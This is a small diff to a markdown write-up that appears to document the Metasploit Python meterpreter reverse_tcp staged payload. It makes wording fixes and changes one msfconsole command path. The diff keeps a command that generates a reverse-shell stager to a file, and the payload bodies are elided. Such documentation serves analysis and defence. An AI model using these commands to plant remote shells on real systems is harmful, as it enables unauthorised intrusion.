@@ -1,10 +1,10 @@
-# Metasploit Python meterpreter/reverse_tcp (staged payload)
+# python/meterpreter/reverse_tcp (staged payload)
 
 ## Stager
 
 ### Generate
 ```
-msf5> use payload/python/meterpreter/reverse_tcp
+msf5> use python/meterpreter/reverse_tcp
 msf5 payload(python/meterpreter/reverse_tcp) > generate -f raw -o stager.py
 ```
 
@@ -53,7 +53,7 @@ The python meterpreter client follows (full contents in file `payload.py`).
 ...
 ```
 
-Towards the end of the payload, the meterpreter is invocated using the socket
+Towards the end of the payload, the meterpreter is invoked using the socket
 provided by the stager in variable `s`:
 ```python
 ...
